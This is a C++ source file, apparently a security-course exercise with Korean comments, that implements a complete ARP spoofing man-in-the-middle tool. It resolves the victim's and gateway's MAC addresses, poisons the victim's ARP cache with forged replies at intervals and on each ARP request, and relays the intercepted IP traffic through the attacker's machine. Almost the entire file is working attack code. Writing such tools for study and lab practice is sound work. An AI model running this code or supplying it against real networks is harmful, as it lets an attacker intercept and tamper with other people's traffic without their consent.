#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <signal.h>
#include <iso646.h>
#include <vector>
#include <map>
#include <set>
#include <thread>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"
using namespace std;
vector<pair<Ip, Ip>> spoof_ip;
map<Ip, Mac> Arp_table;
Ip my_ip;
Mac my_mac;

struct EthArpPacket final
{
    EthHdr eth_;
    ArpHdr arp_;
};
struct EthIpPacket final
{
    EthHdr eth_;
    IpHdr ip_;
};
Ip get_my_IP(const char *ifr)
{
    int sockfd;
    struct ifreq ifrq;
    struct sockaddr_in *sin;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0)
    {
        fprintf(stderr, "Fail to get interface IP address - socket() failed\n");
        exit(-1);
    }
    strcpy(ifrq.ifr_name, ifr);

    //get_ip
    if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0)
    {
        perror("ioctl() SIOCGIFADDR error");
        exit(-1);
    }
    uint8_t ip_arr[Ip::SIZE];
    sin = (struct sockaddr_in *)&ifrq.ifr_addr;
    memcpy(ip_arr, (void *)&sin->sin_addr, sizeof(sin->sin_addr));
    uint32_t ip = (ip_arr[0] << 24) | (ip_arr[1] << 16) | (ip_arr[2] << 8) | (ip_arr[3]);

    return Ip(ip);
}
Mac get_my_MAC(const char *ifr)
{
    int sockfd;
    struct ifreq ifrq;
    struct sockaddr_in *sin;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0)
    {
        fprintf(stderr, "Fail to get interface IP address - socket() failed\n");
        exit(-1);
    }
    strcpy(ifrq.ifr_name, ifr);

    //get_mac
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifrq) < 0)
    {
        perror("ioctl() SIOCGIFHWADDR error");
        exit(-1);
    }
    Mac mac_tmp;
    memcpy(&mac_tmp, ifrq.ifr_hwaddr.sa_data, Mac::SIZE);
    return mac_tmp;
}
int send_ARP_packet(pcap_t *handle, EthArpPacket packet)
{
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }
    return res;
}
int send_IP_packet(pcap_t *handle, const u_char *packet, pcap_pkthdr *header)
{
    //ip의 경우 뒤에 msg가 있으므로 size가 고정되지 않음. u_char*로 전달해야 함
    int res = pcap_sendpacket(handle, packet, header->caplen);
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }
    return res;
}
EthArpPacket make_ARP_REQUEST(Mac smac, Ip sip, Ip tip)
{
    EthArpPacket packet;
    packet.eth_.smac_ = smac;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = smac;
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tip_ = htonl(tip);
    return packet;
}
EthArpPacket make_ARP_REPLY(Mac smac, Mac dmac, Ip sip, Ip tip)
{
    EthArpPacket packet;
    packet.eth_.smac_ = smac;
    packet.eth_.dmac_ = dmac;
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = smac;
    packet.arp_.tmac_ = dmac;
    packet.arp_.sip_ = htonl(sip);
    packet.arp_.tip_ = htonl(tip);
    return packet;
}
Mac get_MAC_by_ARP(pcap_t *handle, const EthArpPacket sendpk)
{
    struct pcap_pkthdr *header;
    const u_char *packet;
    while (1)
    {
        //request 송신
        send_ARP_packet(handle, sendpk);

        //reply 수신
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        //get_mac
        EthArpPacket *ARPpacket = (EthArpPacket *)packet;
        if (ntohs(ARPpacket->eth_.type_) not_eq EthHdr::Arp)
            continue;
        if (ntohs(ARPpacket->arp_.op_) not_eq ArpHdr::Reply)
            continue;
        if (ntohl(ARPpacket->arp_.sip_) not_eq ntohl(sendpk.arp_.tip_))
            continue;
        if (ntohl(ARPpacket->arp_.tip_) not_eq ntohl(sendpk.arp_.sip_))
            continue;
        Mac mac_tmp;
        memcpy(&mac_tmp, &ARPpacket->arp_.smac_, Mac::SIZE);
        return mac_tmp;
    }
    exit(-1);
}

void infect(pcap_t *handle)
{
    //예상치 못한 이유로 끊길 수 있으므로 주기적으로 infect
    //몇초마다 재감염할까요? 일단 30초
    while (1)
    {
        for (auto iter : spoof_ip)
        {
            EthArpPacket spoof_packet1 = make_ARP_REPLY(my_mac, Arp_table[iter.first], iter.second, iter.first);
            //EthArpPacket spoof_packet2 = make_ARP_REPLY(my_mac, Arp_table[iter.second], iter.first, iter.second);
            send_ARP_packet(handle, spoof_packet1);
            //send_ARP_packet(handle, spoof_packet2);
            sleep(1); //한꺼번에 많은 packet 보내면 packet loss 가능성 있음
        }
        sleep(30);
    }
}
void receive(pcap_t *handle)
{
    while (1)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;
        //reply 수신
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        EthHdr *Ethpacket = (EthHdr *)packet;
        //arp_request이면 재감염
        if (ntohs(Ethpacket->type_) == EthHdr::Arp)
        {
            EthArpPacket *ARPpacket = (EthArpPacket *)packet;
            if (ntohs(ARPpacket->arp_.op_) not_eq ArpHdr::Request)
                continue;
            for (auto iter : spoof_ip)
            {
                if (ntohl(ARPpacket->arp_.sip_) not_eq iter.first)
                    continue;
                if (ntohl(ARPpacket->arp_.tip_) not_eq iter.second)
                    continue;
                //sender와 target 모두에게 packet을 날려 양방향 flow 모두를 감염
                //하면 안돼요..ㅠㅠ
                EthArpPacket spoof_packet1 = make_ARP_REPLY(my_mac, Arp_table[iter.first], iter.second, iter.first);
                //EthArpPacket spoof_packet2 = make_ARP_REPLY(my_mac, Arp_table[iter.second], iter.first, iter.second);
                sleep(1);
                send_ARP_packet(handle, spoof_packet1);
                //send_ARP_packet(handle, spoof_packet2);
            }
        }
        //ip이면 relay
        //Iphdr class를 만들고 EthIpPacket로 접근
        if (ntohs(Ethpacket->type_) == EthHdr::Ip4)
        {
            EthIpPacket *Ippacket = (EthIpPacket *)packet;
            for (auto iter : spoof_ip)
            {
                if (Ippacket->eth_.smac_ not_eq Arp_table[iter.first])
                    continue;
                if (Ippacket->eth_.dmac_ not_eq my_mac)
                    continue;
                Ippacket->eth_.smac_ = my_mac; //my_mac을 보내야 CAM table이 깨지지 않음
                Ippacket->eth_.dmac_ = Arp_table[iter.second];
                send_IP_packet(handle, packet, header);
            }
        }
    }
}

int main(int argc, char *argv[])
{
    //매개변수 확인(4개보다 작거나 불완전 입력인지)
    if ((argc < 4) or (argc % 2))
    {
        printf("syntax : arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
        printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
        return -1;
    }

    //pcap_open
    char errbuf[PCAP_ERRBUF_SIZE];
    //여기 BUFSIZ 대신 PCAP_ERRBUF_SIZE 하면 인터넷 연결 안됨
    pcap_t *handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", argv[1], errbuf);
        return -1;
    }

    //attacker(me)의 ip, mac 주소 알아내기
    //함수 반환형을 각각 Ip, Mac으로 수정
    my_ip = get_my_IP(argv[1]);
    my_mac = get_my_MAC(argv[1]);
    // printf("attacker_ip: %s\n", string(my_ip).c_str());
    // printf("attacker_mac: %s\n", string(my_mac).c_str());

    //sender(victim, you)와 target(gateway)의 mac 주소 알아내기
    //<sip, tip>로 각각의 spoof_table을 만들고 map<Ip, Mac>으로 Mac 주소 저장(Arp_table 구현)
    //<sender, target>, <target, sender>를 모두 저장하려고 했으나
    //target -> sender의 reply는 packet size가 너무 커서 relay 불가능
    for (int i = 1; i < argc / 2; i++)
    {
        spoof_ip.push_back({Ip(argv[2 * i]), Ip(argv[2 * i + 1])});
        //spoof_ip.push_back({Ip(argv[2 * i + 1]), Ip(argv[2 * i])});
        if (not Arp_table.count(Ip(argv[2 * i])))
        {
            EthArpPacket sender_packet = make_ARP_REQUEST(my_mac, my_ip, Ip(argv[2 * i]));
            Arp_table[Ip(argv[2 * i])] = get_MAC_by_ARP(handle, sender_packet);
        }
        if (not Arp_table.count(Ip(argv[2 * i + 1])))
        {
            EthArpPacket target_packet = make_ARP_REQUEST(my_mac, my_ip, Ip(argv[2 * i + 1]));
            Arp_table[Ip(argv[2 * i + 1])] = get_MAC_by_ARP(handle, target_packet);
        }
    }
    // for (const auto &[key, value] : Arp_table)
    //     printf("%s : %s\n", string(key).c_str(), string(value).c_str());

    //감염과 릴레이를 동시에 수행해야 한다 -> 스레드 활용
    //스레드 사용법은 https://modoocode.com/269을 참고
    //1. 감염시키는 스레드
    //2. 릴레이하는 스레드
    thread t1(infect, handle);
    thread t2(receive, handle);

    t1.join();
    t2.join();

    pcap_close(handle);
}